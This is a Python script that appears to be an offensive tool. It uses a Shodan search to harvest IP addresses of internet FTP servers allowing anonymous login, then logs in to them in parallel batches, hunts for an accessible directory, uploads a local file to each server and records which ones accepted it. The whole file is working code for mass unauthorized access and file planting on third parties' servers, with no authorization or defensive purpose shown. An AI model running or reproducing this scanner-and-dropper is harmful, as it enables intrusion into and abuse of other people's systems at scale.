from ftplib import FTP
import subprocess
import threading
import socket
import os
import re

# Define the Shodan dork and output file
DORK = '"220" "230 Login successful." port:21'
OUTPUT_FILE = "./assets/ftp_servers.txt"
DROPPED_FILE = "./assets/44.txt"
SUCCESS_FILE = "./assets/success.txt"
successful_servers = []

def shodan(search_query, ips):
    try:
        print('Scanning.....')
        print('This might take a while...')
        count = int(subprocess.run(f'shodan count {search_query}', shell=True, capture_output=True, text=True).stdout.strip()) + 5
        print(f'{count} targets found')
        result = subprocess.run(f'shodan download {ips} {search_query} --limit {count}', shell=True, capture_output=True, text=True).stdout.strip()
        for line in result.splitlines():
            print(line)

        result = subprocess.run(f'shodan parse --fields ip_str {ips}.json.gz', shell=True, capture_output=True, text=True).stdout.strip()
        with open(ips, 'w') as f:
            ipv6_pattern = re.compile(r'\b(?:[a-fA-F0-9]{1,4}:){7}[a-fA-F0-9]{1,4}\b')
            contents = ipv6_pattern.sub('', result)
            ipv4_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
            ipv4_addresses = set(ipv4_pattern.findall(contents))
            unique_ipv4 = '\n'.join(ipv4_addresses)
            f.write(unique_ipv4)

        with open(ips, 'r') as f:
            line_count = sum(1 for line in f)

        print('Scanning complete')
        print('Removing temporary files and cleaning results file...')
        os.remove(ips + '.json.gz')
        print(f'{line_count} targets saved to file')

    except KeyboardInterrupt:
        print('Saving data...\nExiting...')
        result = subprocess.run(f'shodan parse --fields ip_str {ips}.json.gz', shell=True, capture_output=True, text=True).stdout.strip()
        with open(ips, 'w') as f:
            f.write(result)
        os.remove(ips + '.json.gz')

    except Exception as e:
        print(f'An error occurred: {e}')

# Main script
#shodan(DORK, OUTPUT_FILE)

def check_upload_directory(ftp, directory):
    try:
        # Attempt to change to the specified directory
        ftp.cwd(directory)
        # If the change was successful, it means you have permissions to access this directory.
        print(f"Directory '{directory}' is accessible for uploading.")
        return True
    except Exception as e:
        # If you couldn't change to the directory, it means you don't have permissions.
        print(f"Directory '{directory}' is not accessible for uploading. Error: {e}")
        return False

def find_upload_location(ftp, current_directory="/"):
    try:
        # Use passive mode for data transfers
        ftp.set_pasv(True)
        directory_contents = []
        # Use timeout to handle potential network issues
        ftp.timeout = 10

        # List the contents of the current directory
        ftp.retrlines('LIST', directory_contents.append)
        print(f"Listed contents of directory '{current_directory}'.")

        # Check if the current directory is writable
        if check_upload_directory(ftp, current_directory):
            return current_directory

        # If the current directory is not writable, check its subdirectories
        for line in directory_contents:
            parts = line.split(None, 8)
            if parts and parts[-1] not in ('.', '..'):
                item_name = parts[-1]
                item_type = parts[0]
                item_path = f"{current_directory}/{item_name}"

                if item_type.startswith('d'):
                    # If it's a directory, recursively check it
                    result = find_upload_location(ftp, current_directory=item_path)
                    if result:
                        return result
    except socket.timeout as e:
        print(f"FTP operation timed out: {e}")
    except Exception as e:
        print(f"An error occurred during FTP operation: {e}")

    return None

def upload_file(ftp, directory, file_path, server_ip):
    try:
        with open(file_path, 'rb') as file:
            ftp.storbinary(f'STOR {os.path.basename(file_path)}', file)
        print(f"Uploaded file '{file_path}' to '{directory}'.")
        # Add the server IP to the list of successful servers
        successful_servers.append(server_ip)
    except socket.timeout as e:
        print(f"FTP operation timed out: {e}")
    except Exception as e:
        print(f"Failed to upload file to '{directory}'. Error: {e}")

def check_servers(servers):
    for server in servers:
        try:
            print(f"Connecting to FTP server: {server}")

            with FTP(server) as ftp:
                server_ip = server  # Store the IP for success tracking
                ftp.login()  # Log in anonymously
                print(f"Connected to {server} as an anonymous user.")
                upload_location = find_upload_location(ftp)

                if upload_location:
                    upload_file(ftp, upload_location, DROPPED_FILE, server_ip)
                else:
                    print(f"No writable directory found for uploading on '{server}'.")
        except Exception as e:
            print(f"An error occurred while checking server {server}: {e}")

def main():
    try:
        # Read the list of FTP servers from a file
        with open(OUTPUT_FILE, 'r') as server_file:
            ftp_servers = [line.strip() for line in server_file]

        # Split the list into chunks of 200 servers each
        chunk_size = 200
        server_chunks = [ftp_servers[i:i + chunk_size] for i in range(0, len(ftp_servers), chunk_size)]

        threads = []

        for chunk in server_chunks:
            thread = threading.Thread(target=check_servers, args=(chunk,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        # Write the IP addresses of successful servers to the success.txt file
        with open(SUCCESS_FILE, 'w') as success_file:
            for ip in successful_servers:
                success_file.write(ip + '\n')

    except FileNotFoundError:
        print("The file 'ftp_servers.txt' does not exist.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()